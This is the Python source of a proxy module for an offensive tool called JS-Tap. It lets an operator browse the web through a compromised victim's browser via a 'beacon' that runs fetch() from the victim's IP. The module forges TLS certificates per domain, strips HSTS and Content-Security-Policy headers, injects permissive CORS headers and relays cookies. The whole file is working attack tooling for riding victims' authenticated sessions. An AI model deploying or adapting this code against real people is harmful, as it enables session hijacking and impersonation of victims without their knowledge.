"""
MITM HTTP/HTTPS proxy server for JS-Tap.

Operator points their browser at this proxy. Requests are serialized and sent
over a WebSocket to a bex-beacon, which executes the actual fetch() from the
victim's browser/IP. Responses flow back the same path.

Supports multiple simultaneous proxy instances (one per beacon), each on its
own port with its own auth token.
"""
import io
import os
import ssl
import json
import uuid
import secrets
import socket
import base64
import logging
import tempfile
import threading
import socketserver
from http.server import BaseHTTPRequestHandler

from http import HTTPStatus
from proxy.certs import ensure_ca, generate_domain_cert

logger = logging.getLogger('jsTap')

# ---------------------------------------------------------------------------
# Shared state — written by Flask routes, read by proxy handlers
# ---------------------------------------------------------------------------

# beacon_uuid -> WebSocket send function  (set when beacon connects WS)
_ws_connections = {}
_ws_connections_lock = threading.Lock()
# Lock for serializing WebSocket sends (multiple proxy threads share one WS)
_ws_send_lock = threading.Lock()

# request_id -> threading.Event
_pending_requests = {}
# request_id -> response dict  {status, headers, body_b64}
_pending_responses = {}
_pending_lock = threading.Lock()

# CA key/cert (loaded once)
_ca_key = None
_ca_cert = None


def register_ws(beacon_uuid, send_fn):
    """Register a WebSocket send function for a beacon."""
    with _ws_connections_lock:
        _ws_connections[beacon_uuid] = send_fn
    logger.info(f"Proxy: WebSocket registered for beacon {beacon_uuid}")


def unregister_ws(beacon_uuid):
    """Remove a beacon's WebSocket connection."""
    with _ws_connections_lock:
        _ws_connections.pop(beacon_uuid, None)
    logger.info(f"Proxy: WebSocket unregistered for beacon {beacon_uuid}")


def deliver_response(request_id, response_data):
    """Called when a beacon sends back a proxy response over WebSocket."""
    with _pending_lock:
        _pending_responses[request_id] = response_data
        evt = _pending_requests.get(request_id)
    if evt:
        evt.set()


def _send_to_beacon(beacon_uuid, request_obj, timeout=60):
    """Send a serialized HTTP request to a specific beacon and wait for response.
    Returns the response dict or None on timeout."""

    if not beacon_uuid:
        logger.warning("Proxy: No beacon uuid provided")
        return None

    with _ws_connections_lock:
        send_fn = _ws_connections.get(beacon_uuid)
    if not send_fn:
        logger.warning(f"Proxy: No WebSocket connection for beacon {beacon_uuid}")
        return None

    req_id = str(uuid.uuid4())
    request_obj['id'] = req_id

    evt = threading.Event()
    with _pending_lock:
        _pending_requests[req_id] = evt

    try:
        msg = json.dumps(request_obj)
        logger.info(f"Proxy: Sending {request_obj.get('method')} {request_obj.get('url', '')[:80]} to beacon (req_id={req_id})")
        with _ws_send_lock:
            send_fn(msg)
        logger.info(f"Proxy: Message sent, waiting for beacon response (req_id={req_id})")
    except Exception as e:
        logger.error(f"Proxy: Failed to send to beacon: {e}")
        with _pending_lock:
            _pending_requests.pop(req_id, None)
        return None

    evt.wait(timeout=timeout)

    with _pending_lock:
        _pending_requests.pop(req_id, None)
        resp = _pending_responses.pop(req_id, None)

    if not resp:
        logger.warning(f"Proxy: Beacon timed out for request {req_id} ({request_obj.get('method')} {request_obj.get('url', '')[:80]})")

    return resp


# ---------------------------------------------------------------------------
# Raw-socket HTTP reader (used for the inner CONNECT tunnel)
# ---------------------------------------------------------------------------

def _read_chunked_body(rfile):
    """Read a chunked transfer-encoded body and return the reassembled bytes."""
    chunks = []
    while True:
        size_line = rfile.readline(65537)
        if not size_line:
            break
        size_str = size_line.decode('latin-1', errors='replace').strip()
        if not size_str:
            break
        try:
            chunk_size = int(size_str.split(';', 1)[0], 16)
        except ValueError:
            break
        if chunk_size == 0:
            # Read trailing \r\n after the final 0-length chunk
            rfile.readline(65537)
            break
        chunk_data = rfile.read(chunk_size)
        chunks.append(chunk_data)
        # Read the \r\n after the chunk data
        rfile.readline(65537)
    return b''.join(chunks)


def _read_http_request(rfile):
    """Read one HTTP request from a file-like socket stream.
    Returns (method, path, http_version, headers_dict, body_bytes) or None."""
    request_line = rfile.readline(65537)
    if not request_line:
        return None
    request_line = request_line.decode('latin-1', errors='replace').strip()
    if not request_line:
        return None

    parts = request_line.split(' ', 2)
    if len(parts) < 2:
        return None
    method = parts[0]
    path = parts[1]
    http_version = parts[2] if len(parts) > 2 else 'HTTP/1.1'

    headers = {}
    while True:
        line = rfile.readline(65537)
        if not line or line in (b'\r\n', b'\n'):
            break
        line = line.decode('latin-1', errors='replace').strip()
        if ':' in line:
            k, v = line.split(':', 1)
            headers[k.strip()] = v.strip()

    body = b''
    content_length = headers.get('Content-Length') or headers.get('content-length')
    transfer_encoding = headers.get('Transfer-Encoding') or headers.get('transfer-encoding') or ''
    if content_length:
        try:
            body = rfile.read(int(content_length))
        except Exception:
            pass
    elif 'chunked' in transfer_encoding.lower():
        body = _read_chunked_body(rfile)

    return method, path, http_version, headers, body


# Headers that must not be forwarded to the operator's browser through the MITM proxy.
# Alt-Svc:  advertises HTTP/3 (QUIC/UDP) which bypasses the TCP proxy.
# HSTS:     pins certs that won't match our MITM CA.
# CSP:      blocks cross-origin modules/scripts whose context changed through MITM.
# X-Frame-Options:  can block framed content unnecessarily through MITM.
_STRIP_RESPONSE_HEADERS = {
    'alt-svc',
    'strict-transport-security',
    'content-security-policy',
    'content-security-policy-report-only',
    'x-content-security-policy',
    'x-frame-options',
}


def _write_http_response(wfile, status, headers, body, set_cookies=None,
                          request_origin=None):
    """Write an HTTP response to a file-like socket stream.

    request_origin: the Origin header from the request, used to inject
    permissive CORS headers.  The beacon's fetch() runs in an extension
    service-worker whose origin doesn't match the target site, so CORS
    response headers (Access-Control-Allow-Origin, etc.) are often missing
    from the relayed response.  Injecting them here lets the operator's
    browser load cross-origin modules, fonts, and XHR/fetch responses that
    rely on CORS.
    """
    try:
        reason = HTTPStatus(status).phrase
    except ValueError:
        reason = 'Unknown'

    # Always overwrite CORS headers with permissive values.  The beacon's
    # fetch() runs in an extension service-worker whose origin doesn't match
    # the target site, so any CORS headers relayed from the origin server are
    # unreliable / wrong for the operator's browser context.  Strip originals
    # first (they may be under any casing), then inject our own.
    _cors_keys = {
        'access-control-allow-origin', 'access-control-allow-credentials',
        'access-control-allow-methods', 'access-control-allow-headers',
        'access-control-expose-headers', 'access-control-max-age',
    }
    for k in list(headers.keys()):
        if k.lower() in _cors_keys:
            del headers[k]
    headers['Access-Control-Allow-Origin'] = request_origin or '*'
    headers['Access-Control-Allow-Credentials'] = 'true'
    headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, PATCH, OPTIONS'
    headers['Access-Control-Allow-Headers'] = '*'
    headers['Access-Control-Expose-Headers'] = '*'

    status_line = f"HTTP/1.1 {status} {reason}\r\n"
    wfile.write(status_line.encode('latin-1', errors='replace'))
    for k, v in headers.items():
        if k.lower() in _STRIP_RESPONSE_HEADERS:
            continue
        wfile.write(f"{k}: {v}\r\n".encode('latin-1', errors='replace'))
    # Write Set-Cookie headers individually (they must not be joined on a single line)
    if set_cookies:
        for cookie in set_cookies:
            wfile.write(f"Set-Cookie: {cookie}\r\n".encode('latin-1', errors='replace'))
    if 'Content-Length' not in headers and 'content-length' not in headers:
        wfile.write(f"Content-Length: {len(body)}\r\n".encode('latin-1'))
    wfile.write(b"\r\n")
    wfile.write(body)
    wfile.flush()


# ---------------------------------------------------------------------------
# Proxy authentication
# ---------------------------------------------------------------------------

def _check_auth(headers, expected_token):
    """Validate Proxy-Authorization header. Returns True if auth is valid."""
    auth_header = headers.get('Proxy-Authorization') or headers.get('proxy-authorization')
    if not auth_header:
        return False

    # Expect: Basic base64(proxy:token)
    if not auth_header.startswith('Basic '):
        return False

    try:
        decoded = base64.b64decode(auth_header[6:]).decode('utf-8')
    except Exception:
        return False

    # Username must be "proxy", password is the auth token
    if ':' not in decoded:
        return False

    username, password = decoded.split(':', 1)
    return username == 'proxy' and password == expected_token


def _send_407(wfile):
    """Send a 407 Proxy Authentication Required response."""
    body = b'Proxy authentication required'
    wfile.write(b"HTTP/1.1 407 Proxy Authentication Required\r\n")
    wfile.write(b'Proxy-Authenticate: Basic realm="JS-Tap"\r\n')
    wfile.write(f"Content-Length: {len(body)}\r\n".encode('latin-1'))
    wfile.write(b"Connection: close\r\n")
    wfile.write(b"\r\n")
    wfile.write(body)
    wfile.flush()


# ---------------------------------------------------------------------------
# Proxy handler
# ---------------------------------------------------------------------------

class ProxyRequestHandler(socketserver.BaseRequestHandler):
    """Handles one proxy connection from the operator's browser."""

    def handle(self):
        peer = self.client_address
        logger.info(f"Proxy: New connection from {peer[0]}:{peer[1]}")
        try:
            self._handle_connection()
        except (ConnectionResetError, BrokenPipeError) as e:
            logger.info(f"Proxy: Connection closed ({type(e).__name__}) from {peer[0]}:{peer[1]}")
        except ssl.SSLError as e:
            logger.info(f"Proxy: SSL error from {peer[0]}:{peer[1]}: {e}")
        except Exception as e:
            logger.info(f"Proxy: Handler error from {peer[0]}:{peer[1]}: {e}")

    def _handle_connection(self):
        self.request.settimeout(120)
        rfile = self.request.makefile('rb', buffering=0)
        wfile = self.request.makefile('wb')

        # Get per-instance beacon_uuid and auth_token from the server object
        beacon_uuid = getattr(self.server, 'beacon_uuid', None)
        auth_token = getattr(self.server, 'auth_token', None)

        try:
            result = _read_http_request(rfile)
            if not result:
                return
            method, target, http_ver, headers, body = result

            # Check proxy authentication if a token is set
            if auth_token and not _check_auth(headers, auth_token):
                logger.info(f"Proxy: Auth failed from {self.client_address[0]}:{self.client_address[1]}")
                _send_407(wfile)
                return

            if method == 'CONNECT':
                logger.info(f"Proxy: CONNECT {target}")
                self._handle_connect(target, wfile, rfile, beacon_uuid, auth_token)
            else:
                self._handle_plain_http(method, target, headers, body, wfile, beacon_uuid)
        finally:
            try:
                rfile.close()
            except Exception:
                pass
            try:
                wfile.close()
            except Exception:
                pass

    def _handle_plain_http(self, method, url, headers, body, wfile, beacon_uuid):
        """Forward a plain HTTP request through the beacon."""
        logger.info(f"Proxy: {method} {url}")
        origin = headers.get('Origin', headers.get('origin', ''))

        # Handle CORS preflight locally — no need to round-trip to beacon
        if method == 'OPTIONS':
            _write_http_response(wfile, 204, {}, b'', request_origin=origin)
            return

        resp = _send_to_beacon(beacon_uuid, {
            'method': method,
            'url': url,
            'headers': dict(headers),
            'body': base64.b64encode(body).decode() if body else None,
        })

        if not resp:
            _write_http_response(wfile, 502,
                                 {'Content-Type': 'text/plain'}, b'Proxy: no beacon connected')
            return

        status = resp.get('status', 502)
        resp_headers = resp.get('headers', {})
        body_b64 = resp.get('body', '')
        resp_body = base64.b64decode(body_b64) if body_b64 else b''
        set_cookies = resp.get('setCookies', [])

        _write_http_response(wfile, status, resp_headers, resp_body,
                             set_cookies=set_cookies, request_origin=origin)

    def _handle_connect(self, target, wfile, rfile, beacon_uuid, auth_token):
        """MITM a CONNECT tunnel: terminate TLS, read inner HTTP, proxy via beacon."""
        host, _, port = target.partition(':')
        port = int(port) if port else 443

        # Tell the browser the tunnel is established
        wfile.write(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        wfile.flush()

        # Generate a cert for this domain signed by our CA
        cert_pem, key_pem = generate_domain_cert(host, _ca_key, _ca_cert)

        # Write cert+key to temp files for ssl.wrap_socket
        cert_file = tempfile.NamedTemporaryFile(delete=False, suffix='.pem')
        key_file = tempfile.NamedTemporaryFile(delete=False, suffix='.pem')
        try:
            cert_file.write(cert_pem)
            cert_file.close()
            key_file.write(key_pem)
            key_file.close()

            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert_file.name, key_file.name)
            # Force HTTP/1.1 — our parser can't handle HTTP/2 frames
            ctx.set_alpn_protocols(['http/1.1'])

            ssl_sock = ctx.wrap_socket(self.request, server_side=True)
            ssl_sock.settimeout(120)
        except ssl.SSLError as e:
            logger.info(f"Proxy: TLS handshake FAILED for {host}: {e}")
            return
        finally:
            os.unlink(cert_file.name)
            os.unlink(key_file.name)

        logger.info(f"Proxy: TLS handshake OK for {host}")

        # Now read plaintext HTTP requests through the TLS tunnel
        try:
            ssl_rfile = ssl_sock.makefile('rb', buffering=0)
            ssl_wfile = ssl_sock.makefile('wb')

            while True:
                result = _read_http_request(ssl_rfile)
                if not result:
                    break
                method, path, http_ver, headers, body = result

                # Reconstruct the full URL
                url = f"https://{host}{path}"
                logger.info(f"Proxy: {method} {url}")

                origin = headers.get('Origin', headers.get('origin', ''))
                logger.info(f"Proxy: Origin header for {method} {url}: '{origin}'")

                # Handle CORS preflight locally
                if method == 'OPTIONS':
                    _write_http_response(ssl_wfile, 204, {}, b'',
                                         request_origin=origin)
                    conn_hdr = headers.get('Connection', headers.get('connection', ''))
                    if http_ver == 'HTTP/1.0' or conn_hdr.lower() == 'close':
                        break
                    continue

                resp = _send_to_beacon(beacon_uuid, {
                    'method': method,
                    'url': url,
                    'headers': dict(headers),
                    'body': base64.b64encode(body).decode() if body else None,
                })

                if not resp:
                    _write_http_response(ssl_wfile, 502,
                                         {'Content-Type': 'text/plain'},
                                         b'Proxy: beacon did not respond')
                    break

                status = resp.get('status', 502)
                resp_headers = resp.get('headers', {})
                body_b64 = resp.get('body', '')
                resp_body = base64.b64decode(body_b64) if body_b64 else b''
                set_cookies = resp.get('setCookies', [])

                _write_http_response(ssl_wfile, status, resp_headers, resp_body,
                                     set_cookies=set_cookies, request_origin=origin)

                # HTTP/1.0 or Connection: close → done
                conn_hdr = headers.get('Connection', headers.get('connection', ''))
                if http_ver == 'HTTP/1.0' or conn_hdr.lower() == 'close':
                    break

            ssl_rfile.close()
            ssl_wfile.close()
        except (ConnectionResetError, BrokenPipeError, ssl.SSLError, TimeoutError):
            pass
        finally:
            try:
                ssl_sock.close()
            except Exception:
                pass


class ThreadedProxyServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


# ---------------------------------------------------------------------------
# ProxyInstance / ProxyManager — multi-instance proxy management
# ---------------------------------------------------------------------------

# Port range for auto-allocation
_PORT_RANGE_START = 10000
_PORT_RANGE_END = 10099


class ProxyInstance:
    """Encapsulates per-proxy state for one beacon."""

    def __init__(self, beacon_uuid, port, auth_token):
        self.beacon_uuid = beacon_uuid
        self.port = port
        self.auth_token = auth_token
        self.server = None
        self.thread = None
        self.running = False


class ProxyManager:
    """Manages multiple proxy instances, one per beacon."""

    def __init__(self):
        self._instances = {}   # beacon_uuid -> ProxyInstance
        self._lock = threading.Lock()

    def _find_available_port(self):
        """Find the lowest available port in the range by test-binding."""
        used_ports = {inst.port for inst in self._instances.values()}
        for port in range(_PORT_RANGE_START, _PORT_RANGE_END + 1):
            if port in used_ports:
                continue
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind(('0.0.0.0', port))
                sock.close()
                return port
            except OSError:
                continue
        return None

    def start_proxy(self, beacon_uuid, port=0):
        """Start a proxy instance for a beacon. Auto-allocates port if port=0.
        Returns the ProxyInstance or None on failure."""
        global _ca_key, _ca_cert

        with self._lock:
            # If already running for this beacon, return existing
            if beacon_uuid in self._instances:
                inst = self._instances[beacon_uuid]
                if inst.running:
                    return inst

            # Ensure CA exists (first proxy start loads it)
            if _ca_key is None or _ca_cert is None:
                _ca_key, _ca_cert = ensure_ca()

            # Allocate port
            if port == 0:
                port = self._find_available_port()
                if port is None:
                    logger.error("Proxy: No available ports in range")
                    return None

            auth_token = secrets.token_urlsafe(32)

            inst = ProxyInstance(beacon_uuid, port, auth_token)

            try:
                server = ThreadedProxyServer(('0.0.0.0', port), ProxyRequestHandler)
            except OSError as e:
                logger.error(f"Proxy: Failed to bind port {port}: {e}")
                return None

            # Store per-instance state on the server object so handler can access it
            server.beacon_uuid = beacon_uuid
            server.auth_token = auth_token

            inst.server = server
            inst.thread = threading.Thread(target=server.serve_forever, daemon=True)
            inst.thread.start()
            inst.running = True

            self._instances[beacon_uuid] = inst
            logger.info(f"Proxy: Instance started for beacon {beacon_uuid} on port {port}")
            return inst

    def stop_proxy(self, beacon_uuid):
        """Stop the proxy instance for a specific beacon. Returns True if stopped."""
        with self._lock:
            inst = self._instances.pop(beacon_uuid, None)
        if not inst:
            return False
        if inst.server:
            inst.server.shutdown()
        inst.running = False
        logger.info(f"Proxy: Instance stopped for beacon {beacon_uuid}")
        return True

    def stop_all(self):
        """Stop all proxy instances."""
        with self._lock:
            instances = list(self._instances.values())
            self._instances.clear()
        for inst in instances:
            if inst.server:
                inst.server.shutdown()
            inst.running = False
        logger.info("Proxy: All instances stopped")

    def get_instance(self, beacon_uuid):
        """Get the ProxyInstance for a beacon, or None."""
        with self._lock:
            return self._instances.get(beacon_uuid)

    def get_all_instances(self):
        """Return dict of beacon_uuid -> ProxyInstance for all running proxies."""
        with self._lock:
            return dict(self._instances)

    def is_running_for(self, beacon_uuid):
        """Check if a proxy is running for a specific beacon."""
        with self._lock:
            inst = self._instances.get(beacon_uuid)
            return inst is not None and inst.running


# ---------------------------------------------------------------------------
# Module-level singleton and public API functions
# ---------------------------------------------------------------------------

_manager = ProxyManager()


def start_proxy_for_beacon(beacon_uuid, port=0):
    """Start a proxy instance for a beacon. Returns the ProxyInstance."""
    return _manager.start_proxy(beacon_uuid, port=port)


def stop_proxy_for_beacon(beacon_uuid):
    """Stop the proxy for a specific beacon. Returns True if stopped."""
    return _manager.stop_proxy(beacon_uuid)


def stop_all_proxies():
    """Stop all running proxy instances."""
    _manager.stop_all()


def get_proxy_instance(beacon_uuid):
    """Get the ProxyInstance for a beacon, or None."""
    return _manager.get_instance(beacon_uuid)


def get_all_proxy_instances():
    """Return dict of all running proxy instances."""
    return _manager.get_all_instances()


def is_proxy_running_for(beacon_uuid):
    """Check if a proxy is running for a specific beacon."""
    return _manager.is_running_for(beacon_uuid)


# Backward-compat: is_proxy_running() returns True if ANY proxy is running
def is_proxy_running():
    return len(_manager.get_all_instances()) > 0


# Backward-compat: get_active_beacon() returns first running beacon uuid (or None)
def get_active_beacon():
    instances = _manager.get_all_instances()
    if instances:
        return next(iter(instances))
    return None


def has_ws_connection(beacon_uuid):
    with _ws_connections_lock:
        return beacon_uuid in _ws_connections


